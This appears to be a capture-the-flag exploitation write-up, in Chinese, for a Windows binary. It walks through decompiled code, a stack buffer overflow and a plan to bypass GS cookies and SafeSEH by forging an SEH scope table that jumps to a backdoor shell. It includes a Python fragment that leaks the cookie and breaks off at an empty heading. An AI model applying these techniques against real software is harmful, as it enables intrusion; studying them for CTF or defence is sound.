1. in IDA pro, 首先看到有stack cookies的防護機制。

```
; int __cdecl main(int argc, const char **argv, const char **envp)
_main proc near

; __unwind { // __except_handler4
push    ebp
mov     ebp, esp
push    0FFFFFFFEh
push    offset stru_403688
push    offset __except_handler4
mov     eax, large fs:0
push    eax
add     esp, 0FFFFFF40h
mov     eax, ___security_cookie   ======>有stack cookies
xor     [ebp+ms_exc.registration.ScopeTable], eax
xor     eax, ebp
mov     [ebp+var_1C], eax
push    ebx
push    esi
push    edi
push    eax
lea     eax, [ebp+ms_exc.registration]
mov     large fs:0, eax
mov     [ebp+ms_exc.old_esp], esp
mov     dword ptr [ebp+var_B8], 0
mov     [ebp+var_CC], 1
mov     [ebp+var_D0], 1
```

再來大概看一下，發現有疑似可以走後門的地方。
![Image](https://i.imgur.com/s0MwAF4.png)


接下來F5查看反組譯結果。
```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  FILE *v3; // eax
  FILE *v4; // eax
  int v5; // [esp+20h] [ebp-C0h]
  int v6; // [esp+24h] [ebp-BCh]
  char v7; // [esp+28h] [ebp-B8h]
  int i; // [esp+2Ch] [ebp-B4h]
  char v9[128]; // [esp+44h] [ebp-9Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+C8h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  v3 = _acrt_iob_func(1u);
  setvbuf(v3, 0, 4, 0);
  v4 = _acrt_iob_func(0);
  setvbuf(v4, 0, 4, 0);
  puts("ouch! Do not kill me , I will tell you everything");
  sub_401420("stack address = 0x%x\n", (char)v9);
  sub_401420("main address = 0x%x\n", (char)main);
  for ( i = 0; i < 10; ++i )
  {
    puts("Do you want to know more?");
    sub_401000(v9, 10);
    v6 = strcmp(v9, "yes");
    if ( v6 )
      v6 = v6 < 0 ? -1 : 1;
    if ( v6 )
    {
      v5 = strcmp(v9, "no");
      if ( v5 )
        v5 = v5 < 0 ? -1 : 1;
      if ( !v5 )
        break;
      sub_401000(v9, 256);   ======> BOF
    }
    else
    {
      puts("Where do you want to know");
      v7 = sub_401060();
      sub_401420("Address 0x%x value is 0x%x\n", v7);
    }
  }
  ms_exc.registration.TryLevel = -2;
  puts("I can tell you everything, but I never believe 1+1=2");
  puts("AAAA, you kill me just because I don't think 1+1=2??");
  exit(0);
}
```

首先查看sub_401420()函式，猜測應該是print類函式。

```c
sub_401420("stack address = 0x%x\n", (char)v9);
sub_401420("main address = 0x%x\n", (char)main);
```
在程式的一開始就會print出stack address和main address，因此也不怕stack address改變和ASLR了。

接著查看sub_401000函式，是一個get使用者輸入的函式。    
可以看到v9長度只有128，但是卻可以输入256，導致BOF，但是程式出口全部都由exit堵上了。
```c
int __cdecl sub_401000(int a1, int a2)
{
  int i; // [esp+0h] [ebp-8h]
  char v4; // [esp+7h] [ebp-1h]

  for ( i = 0; ; ++i )
  {
    v4 = getchar();
    if ( i == a2 )
      break;
    if ( v4 == 10 )
    {
      *(_BYTE *)(i + a1) = 0;
      return i;
    }
    *(_BYTE *)(i + a1) = v4;
  }
  return i;
}
```

接下來分析這段:
```c
v6 = strcmp(v9, "yes");
    if ( v6 )
      v6 = v6 < 0 ? -1 : 1;
    if ( v6 )
    {
      v5 = strcmp(v9, "no");
      if ( v5 )
        v5 = v5 < 0 ? -1 : 1;
      if ( !v5 )
        break;
      sub_401000(v9, 256);
    }
    else
    {
      puts("Where do you want to know");
      v7 = sub_401060();
      sub_401420("Address 0x%x value is 0x%x\n", v7);
    }
```
當我們的輸入no時，會退出，輸入非no非yes時會stack overflow，輸入yes時，v6==0，會進入else分支，查看sub_401060()。
```c
int sub_401060()
{
  char String; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+1h] [ebp-13h]
  int v3; // [esp+5h] [ebp-Fh]
  int v4; // [esp+9h] [ebp-Bh]
  __int16 v5; // [esp+Dh] [ebp-7h]
  char v6; // [esp+Fh] [ebp-5h]

  String = 0;
  v2 = 0;
  v3 = 0;
  v4 = 0;
  v5 = 0;
  v6 = 0;
  sub_401000((int)&String, 15);
  return atoi(&String);
}
```
該函式會吃我們輸入並將字符串轉為int。    
所以這裡如果想得知地址的值的话，需要将目標地址的十六進制轉換成十進制输入，同時，這裡如果atoi轉換的是一个非數字型數字，那麼轉換會失敗，程式會進入異常處理seh。

之前我們曾經發現疑似後門的system("cmd")，如果能夠控制eip，通過之前我们洩漏出的function address，算出偏移，直接跳轉到system（"cmd"），就可以直接完成攻擊了。

## 攻擊思路
1. 程式最後直接exit，沒有return address可利用。
2. 當觸發exception的時候，會呼叫exception_handler來做處理。
3. 由於有SafeSEH的機制，我們需要合法的exception_handler來做處理，查看其程式碼，發現它會呼叫scopetable中的filter_func和finally_func，所以我們可以利用這個地方，偽造一個scope_table將其設為後門程式的位址。
4. 為了繞過所有防護，利用10次的任意讀址，把我們需要的GS_cookie、next_seh和seh_handler的值leak出來
5. 利用stack overflow將所有需要的東西放進去，之後再觸發exception使exception_handler呼叫後門程式，拿到shell。

![Image](https://i.imgur.com/uglKlPZ.png)

### leak GS_cookie
我們知道GS_cookie是由security_cookie XOR ebp_addr之後再放入ebp-0x1c，所以我們有兩種做法來填入這一格
1. 利用讀址分別讀出security_cookie和ebp_addr的值，再XOR出GS_cookie的值
2. 直接利用GS_cookie的位址讀出他的值

```py
# leak GS_cookie
security_cookie = get_value(main_addr + 0x2f54)  # 0x4004 - 0x10b0 = 0x2f54
GS_cookie = security_cookie ^ (ebp_addr)
GS_COOKIE = get_value(stack_addr + 0x80)
```

### 
